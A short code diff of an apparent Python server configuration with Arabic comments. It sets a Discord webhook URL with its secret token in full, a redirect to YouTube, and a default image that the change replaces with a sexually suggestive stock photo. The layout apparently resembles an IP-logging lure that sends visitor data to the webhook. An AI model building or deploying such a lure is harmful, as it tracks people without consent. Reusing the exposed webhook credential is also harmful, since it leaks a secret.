@@ -12,7 +12,7 @@ PORT = 8080  # المنفذ الذي يعمل عليه السيرفر
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1334788763901231135/TYM4Pqjma73Z7urVGufGYqm_4j6jbwLrtvdqBIZcbt4tgFoS_K-SPCdEwjRDUUW2IaS2"
 
 # رابط الصورة الافتراضية (يمكنك استبداله)
-DEFAULT_IMAGE_URL = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQU3eXP2oMC64NtPsSjHBBaNiQmCVa52bIXcQ&s"
+DEFAULT_IMAGE_URL = "https://previews.123rf.com/images/nobilior/nobilior1412/nobilior141200028/34908808-nice-female-ass-white-background-isolated.jpg"
 
 # رابط الموقع الذي سيتم تحويل المستخدم إليه
 REDIRECT_URL = "https://www.youtube.com/"  # استبدله بأي رابط تريد
